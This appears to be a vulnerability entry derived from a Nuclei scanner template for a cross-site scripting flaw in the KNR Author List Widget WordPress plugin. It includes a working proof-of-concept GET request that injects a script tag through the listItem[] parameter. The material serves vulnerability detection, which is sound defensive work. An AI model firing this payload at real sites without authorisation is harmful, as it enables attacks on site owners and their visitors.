# Nuclei Template: KNR Author List Widget - Cross-site Scripting
**Template ID:** knr-widget-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`knr-widget-xss.yaml`)

## Vulnerability Information & PoC

## Description
KNR Author List Widget suffers from Cross-site Scripting (XSS) in the listItem[] parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/knr-author-list-widget/knrAuthorListCustomSortSave.php?listItem[]=<script>alert(document.domain)</script>
```

## References
- https://wordpress.org/plugins/knr-author-list-widget/
